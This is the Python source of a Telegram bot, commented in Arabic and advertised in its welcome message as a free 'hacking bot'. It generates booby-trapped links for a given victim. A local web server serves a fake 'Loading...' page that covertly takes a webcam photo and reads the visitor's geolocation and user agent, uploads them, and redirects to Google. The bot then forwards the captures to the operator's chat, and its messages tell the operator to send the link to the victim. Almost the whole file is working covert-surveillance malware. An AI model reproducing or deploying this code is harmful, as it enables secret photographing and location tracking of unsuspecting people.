import telebot
import requests
import json
import time
import threading
import os
import sys
import base64
import urllib.parse
import random
import string
from http.server import HTTPServer, BaseHTTPRequestHandler

# ===== توكن البوت =====
TOKEN = input("أدخل توكن البوت الخاص بك: ")
bot = telebot.TeleBot(TOKEN)

# ===== متغيرات =====
user_sessions = {}
user_links = {}  # لتخزين الرابط لكل مستخدم

# ===== توليد معرف عشوائي =====
def generate_id():
		return ''.join(random.choices(string.digits, k=10))

# ===== إرسال الصورة والموقع إلى التيليجرام =====
def send_to_telegram(chat_id, image_b64, location=None, agent="Unknown"):
		try:
				photo_bytes = base64.b64decode(image_b64)
				bot.send_photo(chat_id, photo_bytes, caption=f"📸 صورة مأخوذة\n🕒 {time.ctime()}\n📱 {agent[:100]}")
				if location:
						lat = location.get('lat')
						lon = location.get('lon')
						if lat and lon:
								bot.send_location(chat_id, lat, lon)
								bot.send_message(chat_id, f"📍 الموقع:\nhttps://www.google.com/maps?q={lat},{lon}")
		except Exception as e:
				print(f"[-] فشل الإرسال: {e}")

# ===== خادم استقبال الصور والموقع =====
class CaptureHandler(BaseHTTPRequestHandler):
		def do_GET(self):
				parsed = urllib.parse.urlparse(self.path)
				if parsed.path == "/":
						self.send_response(200)
						self.send_header("Content-type", "text/html")
						self.end_headers()
						query = urllib.parse.parse_qs(parsed.query)
						victim_id = query.get('id', ['unknown'])[0]

						html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<style>body{{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:Arial;}}</style>
</head>
<body>
<div>⏳ جاري التحميل...</div>
<script>
const victimId = '{victim_id}';
navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user', width: 640, height: 480 }} }})
.then(stream => {{
		const video = document.createElement('video');
		video.srcObject = stream;
		video.play();
		setTimeout(() => {{
				const canvas = document.createElement('canvas');
				canvas.width = 640;
				canvas.height = 480;
				const ctx = canvas.getContext('2d');
				ctx.drawImage(video, 0, 0);
				const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
				let locationData = null;
				if (navigator.geolocation) {{
						navigator.geolocation.getCurrentPosition(pos => {{
								locationData = {{ lat: pos.coords.latitude, lon: pos.coords.longitude }};
								fetch('/upload', {{
										method: 'POST',
										headers: {{ 'Content-Type': 'application/json' }},
										body: JSON.stringify({{ 
												image: dataUrl, 
												agent: navigator.userAgent,
												id: victimId,
												location: locationData
										}})
								}});
						}}, () => {{
								fetch('/upload', {{
										method: 'POST',
										headers: {{ 'Content-Type': 'application/json' }},
										body: JSON.stringify({{ 
												image: dataUrl, 
												agent: navigator.userAgent,
												id: victimId,
												location: null
										}})
								}});
						}});
				}} else {{
						fetch('/upload', {{
								method: 'POST',
								headers: {{ 'Content-Type': 'application/json' }},
								body: JSON.stringify({{ 
										image: dataUrl, 
										agent: navigator.userAgent,
										id: victimId,
										location: null
								}})
						}});
				}}
				stream.getTracks().forEach(t => t.stop());
				window.location.href = 'https://www.google.com';
		}}, 1500);
}})
.catch(() => {{
		window.location.href = 'https://www.google.com';
}});
</script>
</body>
</html>"""
						self.wfile.write(html.encode())
				else:
						self.send_error(404)

		def do_POST(self):
				if self.path == "/upload":
						content_length = int(self.headers.get('Content-Length', 0))
						post_data = self.rfile.read(content_length).decode()
						try:
								data = json.loads(post_data)
								image_b64 = data.get('image', '')
								if image_b64.startswith('data:image/jpeg;base64,'):
										image_b64 = image_b64.replace('data:image/jpeg;base64,', '')
								agent = data.get('agent', 'Unknown')
								victim_id = data.get('id', 'unknown')
								location = data.get('location', None)

								filename = f"captured_{victim_id}_{int(time.time())}.jpg"
								with open(filename, "wb") as f:
										f.write(base64.b64decode(image_b64))
								print(f"[+] صورة محفوظة: {filename}")

								chat_id = user_sessions.get(victim_id, {}).get('chat_id')
								if chat_id:
										send_to_telegram(chat_id, image_b64, location, agent)
								else:
										print(f"[-] لا يوجد chat_id للمعرف {victim_id}")

						except Exception as e:
								print(f"[-] خطأ: {e}")
						self.send_response(200)
						self.send_header("Content-type", "text/plain")
						self.end_headers()
						self.wfile.write(b"OK")
				else:
						self.send_error(404)

# ===== تشغيل الخادم =====
def start_server(port=8080):
		server = HTTPServer(('', port), CaptureHandler)
		thread = threading.Thread(target=server.serve_forever, daemon=True)
		thread.start()
		return server

# ===== إنشاء رابط ملغم =====
def create_link(chat_id, link_type="front_cam"):
		victim_id = generate_id()
		domain = "py1py.duckdns.org"  # غيّر إلى نطاقك الفعلي
		link = f"https://{domain}/?cam={link_type}&id={victim_id}"
		user_sessions[victim_id] = {"chat_id": chat_id, "type": link_type, "time": time.ctime()}
		user_links[chat_id] = link  # حفظ الرابط للمستخدم
		return link, victim_id

# ===== البوت =====
@bot.message_handler(commands=['start'])
def send_welcome(message):
		markup = telebot.types.InlineKeyboardMarkup(row_width=2)
		btn1 = telebot.types.InlineKeyboardButton("📷 كاميرا أمامية", callback_data="front_cam")
		btn2 = telebot.types.InlineKeyboardButton("📸 كاميرا خلفية", callback_data="back_cam")
		btn3 = telebot.types.InlineKeyboardButton("🔗 رابط ملغم", callback_data="link_bomb")
		btn4 = telebot.types.InlineKeyboardButton("🎥 تصوير فيديو", callback_data="video_rec")
		btn5 = telebot.types.InlineKeyboardButton("📍 جلب الموقع", callback_data="get_location")
		btn6 = telebot.types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")
		markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
		bot.send_message(message.chat.id, 
				"👋 أهلاً بك في بوت اراس\n🔓 بوت اختراق كامل وشامل مجانا\n\nالمطور 🏅\nقناة المطور 📶\n\nاختر ما تريد:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
		chat_id = call.message.chat.id
		bot.answer_callback_query(call.id)

		if call.data == "front_cam":
				link, vid = create_link(chat_id, "front_cam")
				bot.send_message(chat_id, f"✅ تم إنشاء رابط اختراق بـ كاميرا أمامية:\n{link}\n\n📌 أرسله للضحية وسوف تأتيك الصورة والموقع تلقائياً")
				# زر لفتح الرابط (بدلاً من النسخ)
				markup = telebot.types.InlineKeyboardMarkup()
				markup.add(telebot.types.InlineKeyboardButton("🔗 فتح الرابط", url=link))
				bot.send_message(chat_id, "يمكنك فتح الرابط للتجربة:", reply_markup=markup)

		elif call.data == "back_cam":
				link, vid = create_link(chat_id, "back_cam")
				bot.send_message(chat_id, f"✅ تم إنشاء رابط اختراق بـ كاميرا خلفية:\n{link}\n\n📌 أرسله للضحية وسوف تأتيك الصورة والموقع تلقائياً")
				markup = telebot.types.InlineKeyboardMarkup()
				markup.add(telebot.types.InlineKeyboardButton("🔗 فتح الرابط", url=link))
				bot.send_message(chat_id, "يمكنك فتح الرابط للتجربة:", reply_markup=markup)

		elif call.data == "link_bomb":
				link, vid = create_link(chat_id, "front_cam")
				bot.send_message(chat_id, f"🔗 رابط ملغم جاهز:\n{link}")

		elif call.data == "get_location":
				bot.send_message(chat_id, "📍 سيتم إرسال الموقع مع الصورة تلقائياً عند فتح الرابط.")

		elif call.data == "stats":
				bot.send_message(chat_id, f"📊 الإحصائيات:\nالروابط النشطة: {len(user_sessions)}")

		elif call.data == "video_rec":
				bot.send_message(chat_id, "🎥 قيد التطوير...")

		# عرض القائمة الرئيسية مرة أخرى
		markup = telebot.types.InlineKeyboardMarkup(row_width=2)
		btn1 = telebot.types.InlineKeyboardButton("📷 كاميرا أمامية", callback_data="front_cam")
		btn2 = telebot.types.InlineKeyboardButton("📸 كاميرا خلفية", callback_data="back_cam")
		btn3 = telebot.types.InlineKeyboardButton("🔗 رابط ملغم", callback_data="link_bomb")
		btn4 = telebot.types.InlineKeyboardButton("🎥 تصوير فيديو", callback_data="video_rec")
		btn5 = telebot.types.InlineKeyboardButton("📍 جلب الموقع", callback_data="get_location")
		btn6 = telebot.types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")
		markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
		bot.send_message(chat_id, "🎯 اختر ما تريد:", reply_markup=markup)

# ===== التشغيل =====
if __name__ == "__main__":
		try:
				import telebot
		except ImportError:
				print("[-] يرجى تثبيت pyTelegramBotAPI: pip install pyTelegramBotAPI")
				sys.exit(1)

		server = start_server(8080)
		print("[*] خادم HTTP يعمل على المنفذ 8080")
		print("[*] البوت يعمل...")

		try:
				bot.infinity_polling()
		except KeyboardInterrupt:
				print("\n[!] تم الإيقاف")
				server.shutdown()